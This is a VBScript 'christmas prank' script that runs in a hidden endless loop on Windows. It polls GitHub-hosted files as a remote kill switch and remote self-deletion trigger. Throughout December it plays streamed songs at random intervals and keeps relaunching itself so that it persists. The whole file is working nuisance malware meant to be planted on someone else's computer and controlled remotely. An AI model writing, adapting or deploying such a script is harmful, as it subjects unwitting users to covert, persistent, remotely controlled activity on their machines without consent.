Dim rlTimer, songNum
rlTimer = 0
songNum = 0

REM Payload and Kill Switch
Do
	REM Remote kill switch detector
	REM Checks http status, if status is anything but 200 script self terminates
	REM Kill switch delay is dependant on DNS server updates (may be quick or it may take 15min)
	Dim killCmd, killURL
	set killURL = CreateObject("Msxml2.ServerXMLHTTP")
	killURL.open "GET", "https://raw.githubusercontent.com/MooSick/coolness/main/kill", False
	killURL.send
	If killURL.status <> 200 Then wscript.quit 0 End If
	set killURL = Nothing
	
	
	REM Remote deletion [W.I.P]
	Dim delURL
	set delURL = CreateObject("Msxml2.ServerXMLHTTP")
	delURL.open "GET", "https://raw.githubusercontent.com/MooSick/coolness/main/delete", False
	delURL.send
	If delURL.status = 200 Then Call delInstance End If
	set delURL = Nothing
		
	
	REM Starts spreading chrismas joy
	REM Will activate on the first of December
	If (Month(Now) = 12) And (Day(Now) < 25) Then
		Do
			REM Ramdomizer: Sets delay between songs in milliseconds
			REM ranDelay will be randomly assigned value of 0-seconds to 2-hours plus 5-minutes
			REM songNum will randomly select a value between 0 and 3 where 0 == function sound1
			dim ranDelay
			Randomize
			ranDelay = Int(Rnd*7200000)+300000
			songNum = Int(Rnd*4)
			wscript.sleep ranDelay
			
			REM Selects song based on songNum's random value
			If songNum = 0 Then Call sound1 Else If songNum = 1 Then Call sound2 Else If songNum = 2 Then Call sound3 Else If songNum = 3 Then Call sound4 End If
			
			REM rlTimer is the ReloadTimer, it will create a new instance of this script and then self terminate
			rlTimer = rlTimer + 1
			If rlTimer > 5 Then newInstance() End If
			If rlTimer > 5 Then WScript.quit 0 End If
			
			REM This statement makes sure that songNum never goes above 3
			If songNum > 3 Then songNum = 0 End If
			
			REM Stops spreading christmas joy
			REM Payload loop will stop on the 26th of December
			If (Month(Now) = 12) And (Day(Now) > 25) Then Exit Do End If
		Loop
	End If
Loop

REM Sound One
Function sound1()
	With CreateObject("WMPlayer.OCX")
		.url = "https://github.com/MooSick/coolness/blob/main/grymg.mp3?raw=true"
		.controls.play
		Do
			WScript.Sleep 100
		Loop Until .playState = 1
	End With
	songNum = songNum + 1
End Function

REM Sound Two
Function sound2()
	With CreateObject("WMPlayer.OCX")
		.url = "https://github.com/MooSick/coolness/blob/main/dth.mp3?raw=true"
		.controls.play
		Do
			WScript.Sleep 100
		Loop Until .playState = 1
	End With
	songNum = songNum + 1
End Function

REM Sound Three
Function sound3()
	With CreateObject("WMPlayer.OCX")
		.url = "https://github.com/MooSick/coolness/blob/main/hamlcm.mp3?raw=true"
		.controls.play
		Do
			WScript.Sleep 100
		Loop Until .playState = 1
	End With
	songNum = songNum + 1
End Function

REM Sound Four
Function sound4()
	With CreateObject("WMPlayer.OCX")
		.url = "https://github.com/MooSick/coolness/blob/main/scictt.mp3?raw=true"
		.controls.play
		Do
			WScript.Sleep 100
		Loop Until .playState = 1
	End With
	songNum = songNum + 1
End Function

REM Creates new instance of this script
Function newInstance()
	Dim objShell
	Set objShell = WScript.CreateObject("WScript.Shell")
	
	objShell.Run ".\christmas-prank.vbs"
	
	Set objShell = Nothing
End Function

REM Deletes the script file
Function delInstance()
	set obj = createobject("Scripting.FileSystemObject")
	Dim rmFile
	rmFile = ".\christmas-prank.vbs"
	obj.DeleteFile rmFile
	Set obj = Nothing
	wscript.quit 0
End Function
